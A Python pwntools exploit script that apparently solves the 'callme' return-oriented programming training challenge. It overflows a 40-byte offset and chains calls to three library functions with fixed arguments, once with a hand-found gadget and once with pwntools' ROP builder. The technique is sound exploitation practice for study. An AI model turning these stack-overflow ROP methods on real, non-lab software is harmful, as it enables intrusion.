#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './callme'
elf = context.binary = ELF(exe, checksec=True)
libc = './libcallme.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '', 1337

def init(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = init()
rop = ROP(exe)

# Got manually through cyclic gdb-pwndbg
offset = 40

# rop gadget to setup parameters
param_setup = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]

# flattening  payload here
payload = flat({
    offset: [
        param_setup,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        elf.sym['callme_one'],
        param_setup,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        elf.sym['callme_two'],
        param_setup,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        elf.sym['callme_three'],
    ]
})

# sending payload
io.sendlineafter(b'>', payload)

io.interactive()
io.close()


# =========================================================
#                      AUTO EXPLOITS
# =========================================================
io = init()
rop = ROP(exe)

# Got manually through cyclic gdb-pwndbg
offset = 40

# set up parameters
parameters = [
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d
]

# crafting rop chain here
rop.callme_one(*parameters)
rop.callme_two(*parameters)
rop.callme_three(*parameters)
print(rop.dump())

# flattening  payload here
payload = flat({
    offset: [
        rop.chain()
    ]
})

# sending payload
io.sendlineafter(b'>', payload)

io.interactive()
io.close()